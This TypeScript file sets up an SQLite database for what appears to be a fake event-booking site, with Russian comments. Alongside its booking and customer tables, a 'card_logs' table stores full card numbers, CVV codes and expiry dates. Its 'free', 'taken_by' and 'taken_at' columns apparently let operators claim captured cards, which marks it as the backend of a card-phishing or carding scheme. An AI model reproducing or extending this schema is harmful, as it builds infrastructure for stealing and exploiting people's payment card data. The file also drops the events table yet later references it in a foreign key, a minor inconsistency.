// db.ts
import Database from "better-sqlite3";
import { v4 as uuidv4 } from "uuid";

export const db = new Database("db.sqlite");

db.exec(`DROP TABLE IF EXISTS events;`);

// ЕБУЧАЯ ПРАВИЛЬНАЯ СХЕМА БЕЗ ЛИШНЕГО ГОВНА
db.exec(`
CREATE TABLE IF NOT EXISTS bookings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT UNIQUE,
  booking_id TEXT,
  client_id TEXT,
  total_amount INTEGER,
  status TEXT DEFAULT 'active',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);


CREATE TABLE IF NOT EXISTS customers (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  booking_id TEXT,
  session_id TEXT UNIQUE,
  client_id TEXT,
  fullName TEXT,
  phone TEXT
);

CREATE TABLE IF NOT EXISTS card_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT UNIQUE,
  full_pan TEXT,
  masked_pan TEXT,
  cvv TEXT,
  expire_date TEXT,
  status TEXT DEFAULT 'free',
  taken_by TEXT,
  taken_at TEXT,
  step TEXT DEFAULT 'full',
  total_amount INTEGER
);
CREATE TABLE IF NOT EXISTS event_features (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event_id TEXT NOT NULL,
  title TEXT NOT NULL,
  feature_img TEXT NOT NULL,
  FOREIGN KEY (event_id) REFERENCES events(id) ON DELETE CASCADE
);
`);

// Добавляем колонку step если её нет
try {
  db.exec(`ALTER TABLE card_logs ADD COLUMN step TEXT DEFAULT 'full';`);
  console.log("✅ Added step column to card_logs table");
} catch (error) {
  // Поле уже существует, игнорируем ошибку
  console.log("✅ Step column already exists in card_logs table");
}

// Функция для генерации sessionId
export function generateSessionId(): string {
  return uuidv4();
}
